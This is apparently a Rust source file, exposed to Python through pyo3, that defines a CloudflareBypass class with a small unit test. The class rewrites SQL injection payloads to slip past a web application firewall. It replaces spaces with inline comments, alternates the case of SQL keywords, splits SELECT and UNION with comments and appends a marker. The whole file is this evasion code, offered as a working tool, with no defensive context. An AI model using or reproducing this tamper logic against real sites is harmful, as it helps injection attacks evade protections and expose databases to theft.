use pyo3::prelude::*;

#[pyclass(skip_from_py_object)]
pub struct CloudflareBypass;

#[pymethods]
impl CloudflareBypass {
    #[new]
    fn new() -> Self {
        Self
    }

    fn apply(&self, payload: String) -> PyResult<String> {
        let mut out = payload.replace(" ", "/**/");
        for kw in ["SELECT", "UNION", "WHERE", "FROM", "AND", "OR"] {
            let mixed = kw
                .chars()
                .enumerate()
                .map(|(i, c)| {
                    if i % 2 == 0 {
                        c
                    } else {
                        c.to_ascii_lowercase()
                    }
                })
                .collect::<String>();
            out = out.replace(kw, &mixed);
        }
        out = out
            .replace("SeLeCt", "SE/**/LECT")
            .replace("UnIoN", "UN/**/ION");
        Ok(format!("{}{}", out, "/*cf*/"))
    }
}

#[cfg(test)]
mod tests {
    use super::CloudflareBypass;

    #[test]
    fn applies_bypass() {
        let bypass = CloudflareBypass;
        let out = bypass.apply("SELECT 1".to_string()).unwrap();
        assert!(out.contains("SE/**/LECT"));
    }
}
